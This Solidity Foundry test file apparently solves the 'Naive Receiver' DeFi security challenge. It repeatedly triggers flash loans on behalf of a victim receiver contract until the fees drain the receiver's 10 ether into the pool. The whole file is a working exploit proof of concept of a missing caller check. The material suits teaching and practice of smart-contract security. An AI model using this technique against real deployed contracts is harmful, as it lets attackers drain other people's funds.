// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {NaiveReceiverLenderPool} from "../src/NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "../src/FlashLoanReceiver.sol";
import "../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverTest is Test {
    NaiveReceiverLenderPool public naiveReceiverLenderPool;
    FlashLoanReceiver public flashLoanReceiver;
    address user1 = vm.addr(1);

    function setUp() public {
        vm.deal(user1, 100 ether);

        naiveReceiverLenderPool = new NaiveReceiverLenderPool();
        vm.deal(address(naiveReceiverLenderPool), 1000 ether);

        flashLoanReceiver = new FlashLoanReceiver(address(naiveReceiverLenderPool));
        vm.deal(address(flashLoanReceiver), 10 ether);
    }

    function test_trusterExploitr() public {
        vm.startPrank(user1);
        assertEq(address(naiveReceiverLenderPool).balance, 1000 ether);
        assertEq(address(flashLoanReceiver).balance, 10 ether);

        for (uint i = 0; i < 10; i++) {
            naiveReceiverLenderPool.flashLoan(
                IERC3156FlashBorrower(flashLoanReceiver), 
                naiveReceiverLenderPool.ETH(),
                100 ether,
                ""
            ); 
        }

        assertEq(address(naiveReceiverLenderPool).balance, 1010 ether);
        assertEq(address(flashLoanReceiver).balance, 0);
    }
}
